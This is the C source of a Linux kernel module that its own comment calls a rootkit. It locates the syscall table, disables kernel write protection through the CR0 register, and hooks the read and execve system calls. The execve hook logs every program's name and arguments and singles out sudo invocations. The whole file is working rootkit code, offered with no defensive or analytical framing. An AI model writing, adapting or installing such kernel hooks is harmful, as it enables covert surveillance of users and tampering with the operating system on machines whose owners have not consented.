#include<linux/init.h>
#include<linux/module.h>
#include<linux/syscalls.h>
#include<linux/kallsyms.h>
#include<linux/slab.h>
#include<asm/unistd.h>
#include<linux/gfp.h>
#include<linux/kern_levels.h>
#include<asm/paravirt.h>

#include<linux/binfmts.h>
#include<linux/uaccess.h>

unsigned long **SYS_CALL_TABLE;

unsigned long cr0;
extern unsigned long __force_order;
char char_buffer[255] = {0};
char argz[255][255] = {0};

size_t argc = 0;

char CharBuffer [255] = {'\0'};
char Argz [255] = {'\0'};

static inline void write_forced_cr0(unsigned long val){
	asm volatile("mov %0,%%cr0":"+r" (val),"+m"(__force_order));
}

static inline void EnablePageWriting(void){ //write_cr0(0) //
	write_forced_cr0(read_cr0() & (~0x10000));
}


static inline void DisablePageWriting(void){ /*write_cr0(1) */
	write_forced_cr0(read_cr0() | 0x10000);
}


asmlinkage int (*original_execve)(const char *filename, char *const argv[], char *const envp[]); /*Original execve() syscall*/

asmlinkage int HookExecve(const char *filename, char *const argv[], char *const envp[])
{
	//printk("*****READ SYSCALL HOOKED HERE By OUR ROOTKIT*****");
	copy_from_user(&CharBuffer, filename, strnlen_user(filename, sizeof(CharBuffer)-1));
	printk(KERN_INFO "EXECUTABLE NAME %s \n", CharBuffer);

		char *ptr = 0xf00d;
		int i=0;
		for(i=0;i<10;i++){
			if (ptr){
				int success = copy_from_user(&ptr, &argv[i], sizeof(ptr));
				if (success == 0 && ptr){
					strncpy_from_user(Argz, ptr, sizeof(Argz));
					printk(KERN_INFO "Args %s \n", Argz);
					memset(Argz, 0, sizeof(Argz));
				}
			}
		}
		if (strcmp(CharBuffer, "/usr/bin/sudo") == 0 ){
			printk(KERN_INFO "Sudo EXECUTED!");
		}
	return (*original_execve)(filename,argv, envp); 

}

asmlinkage int (*original_read)(unsigned int, void __user*, size_t);

asmlinkage int HookRead(unsigned int fd, void __user* buf, size_t count){
	return (*original_read)(fd, buf, count);
}
static int __init SetHooks(void){
	/*access Syscall Table*/
	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table");

	printk(KERN_INFO "HOOKS Will be Set\n");
	printk(KERN_INFO "SYSTEM CALL TABLE at %p\n", SYS_CALL_TABLE);
	
	cr0 = read_cr0();
	EnablePageWriting();
	printk(KERN_INFO "Page writing enabled>>>>>>>>>");

	/*Replace pointer of Syscall_read by our Syscall*/
	original_read = (void*)SYS_CALL_TABLE[__NR_read];
	SYS_CALL_TABLE[__NR_read] = (unsigned long*)HookRead;

	original_execve = (void*)SYS_CALL_TABLE[__NR_execve];
	SYS_CALL_TABLE[__NR_execve] = (unsigned long*)HookExecve;
	
	cr0 = read_cr0();
	DisablePageWriting();
	printk(KERN_INFO "Page writing disabled<><><><><");

	return 0;
}

static void __exit HookCleanup(void){

	/*Clean up our Hook*/
	EnablePageWriting();
	SYS_CALL_TABLE[__NR_read] = (unsigned long*)original_read;
	SYS_CALL_TABLE[__NR_execve] = (unsigned long*)original_execve;
	DisablePageWriting();

	printk(KERN_INFO "HooksCleaned Up! ");
}

module_init(SetHooks);
module_exit(HookCleanup);

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Rooter");
MODULE_DESCRIPTION("Simple Hooking of a READ Syscall");
MODULE_VERSION("1.0");
